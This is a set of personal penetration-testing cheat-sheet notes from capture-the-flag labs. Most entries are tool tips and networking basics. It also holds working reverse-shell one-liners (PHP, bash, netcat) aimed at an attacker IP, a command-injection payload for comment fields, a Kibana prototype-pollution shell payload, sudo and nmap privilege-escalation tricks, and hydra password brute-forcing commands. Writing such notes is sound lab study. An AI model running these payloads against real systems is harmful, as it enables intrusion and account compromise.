


*
-sC flag in nmap runs a set of default NSE scripts, some of them are intrusive so this should not be run against real machines.


*
-A flag means agressive. It consists of 
-A: Enable OS detection, version detection, script scanning, and traceroute


*
nmap run without sudo does TCP scan (-sT) and with sudo SYN scan (-sS). SYYN scan is better as it is a stealth one - sends RST flag to server so it avoids getting detected by firewall (for example). On the other side, it can destabilize weak applications on a server .


*
To check if there is a nse script for X service:

`grep "X" /usr/share/nmap/scripts/script.db`


*
Getting rev shell when there is a chance to write a comment

`<img src=http://10.6.46.150/$(nc.traditional$IFS-e$IFS/bin/bash$IFS'10.6.46.150 '$IFS'4444')>`

 
*
SPAWNING INTTERACTING SHELL WITH PYTHON

`python3 -c 'import pty;pty.spawn("/bin/bash")'`   


*
Listing all binaries with suid permission

`find / -perm -u=s -type f 2>/dev/null`


*
link to access a modified WP theme - `404.php` (to get rev shell)

`http://10.10.142.159/wp-content/themes/twentyfifteen/404.php`


*
if there is a filtering, it is needed to add command in backslashes e.g `l\s -la`


*
PHP REV SHELL ONE LINER

`php -r '$sock=fsockopen("10.6.46.150",4444);exec("/bin/sh -i <&3 >&3 2>&3");'`


*
BASH REV SHELL ONELINER

`bash -i &>/dev/tcp/10.6.46.150/4444 <&1`


*
There are many different converters to john format

`bin2john / zip2john / gpg2john`


*
7z is a file to extract


*
binwalk -->> tool to check of there is a zip file inside .png image

`binwalk -e file`


*
NMAP SHELL

Old version of nmap can be used to escalate to root

`nmap --version` to check version

`nmap --interactive` to enter interacttive mode

and then `!sh` to get root


*
BRAINFUCK decoder

`https://www.splitbrain.org/_static/ook/`

++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>++++++++++++++.------------.+++++.>+++++++++++++++++++++++.<<++++++++++++++++++.>>-------------------.---------.++++++++++++++.++++++++++++.<++++++++++++++++++.+++++++++.<+++.+.>----.>++++.


*
XOR DECODER

`http://xor.pw/#`


*
SPEECH TO TEXT CONVERTER

`https://speech-to-text-demo.ng.bluemix.net/`


*
PHP 5 is vulnerable to "null byte injection" 

TL;DR adding '\00' in the end of command.

https://www.cvedetails.com/cve/CVE-2006-7243/


*
Becoming root with python script and with no read/write rights:

`mv script.py script.py.bak` ---> renaming original script

`echo "import pty" > script.py` ---> adding pty library = pseudo terminal utilities

`echo "pty.spawn('/bin/bash')" >> script.py` ---> adding a spawn function

and executing a script with path given in `sudo -l` e.g `sudo -u root /usr/bin/python /home/script.py`


*
`wget -r` downloads all files of a directory


*
Kibana runs usually on port `5601`

It is always good to check it's version (Management section) and if it is vulnerable to `protype pollution`.

TL;DR We run netcat and inject a payload in Timelion, run it and open Canvas to get shell in netcat's terminal.

```
.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -c \'bash -i>& /dev/tcp/10.6.46.150/4444 0>&1\'");//')
.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
```

*
FINDING CAPABILITIES

`getcap -r / 2>/dev/null` 

`2>/dev/null` -
--> discards all STDERR


*
Nessus is an automated scanner which runs on port `8834`. It mixes functions of nmap, nikto or zap together and provides many profiles calles `Policies`


*
Finding password for admin based on request and error message:

`hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.63.60 http-post-form "/admin/index.php:user=^USER^&pass=^PASS^:Username or password invalid" -V`

Finding password knowing username:

`hydra -l $USER -P /usr/share/wordlists/rockyou.txt 10.10.147.74 $SERVICE`

$SERVICE --> ssh, ftp...


*
Sometimes in order to access a hidden website, it is needed to turn off javascript in a browser.

In Firefox:

`about:config` --> `javascript enabled` --> change to `false`


*
Looking for 'word' inside a file:

`egrep 'word' file.txt` 

Shows how many times 'word' appears in a file:

`egrep -n 'word' file txt `

Looks for for a 'word' and shows in which line it is:

`grep -Hrn 'word' /path`


*
It is possible to bruteforce jwt tokens with `jwt-tool`


*
To launch script from anywhere it is not needed to add it to path but to:

`/usr/bin` and `/usr/local/bin`

It needs correct permission before `chmod 755`


*
Pushing files from one directory without constantly repeating commands:

`git commit -a -m "message here" && git push origin main`



*
While there is LFI, it is important to check if link is vulnerable to `php://filter`

`php://filter/convert.base64-encode/resource`



*
To demonstrate computer networking, there was introduced a model called OSI (Open Systems Interconnection), it consists of 7 layers:

APPLICATION

PRESENTATION

SESSION

TRANSPORTS

NETWORK

DATA LINK

PHYSICAL

To remember it `Anxious Pale Shakespeare Treated Nervously Drinks Patiently`



*
TCP (Transmission Control Protocol) model is as follows:

Application

Transport

Internet

Network inteface

It is a three-way-handshake = SYN - SYN/ACK - ACK



*
`strcmp` compares a string with another in C

`ltrace` is a tool great for reverse which runs an ELF step by step

`radare2 -d file` opens binary in debugging mode

`aaa` analyze all

`afl` lists all  functions

`pdf @function` views function structure

`px @rsi` views value of registry

`db 0x0040082c` sets breakpoint in specific point

`dc` runs a program

`ood 'argument'` sets an argument



*
`TTL` in domain name is `Time to Live` so a time, after which computer should request data of domain once again, instead of relying on copy from cache. Time is in seconds

`Recursive` DNS is a server which stores cache of domain names, so that computer knows where to ask first.

`root name server` is the one above `recursive` ones. Computer request info from it, if domain name is not stored in cache of `recursive`. There are `13` on whole world.

`TLD = Top Level Domain` are servers which store info for specific extensions `.com` etc. They are above (like roots) recursive.

`Authorative` name servers are used to store DNS records for domains directly. 

*

DNS request goes like this: `computer` checks `local cache`, then if nothing found requests `recursive` --> `root name` points where is a domain and gives response back --> recursive points to `top level domain` to get `extension` which responds back --> 

`recursive` request an `authorative` which has all parameters abotu domain 



*
`-d` stands for `data` in curl POST request e.g `curl -X POST -d "flag_please"`

`-c` stands for `cookie-jar` and is used in getting a cookie from website e.g `curl -c -  '$IP' `

`-b` sets a cookie, using GET requests e.g `curl -b "Name=Value" $IP"`



*
If there is `.yml` file involved, it is good to check if  `yaml deserialization attack` in python is possible



*
`pspy` is a tool which shows processes, crons run by all users on machine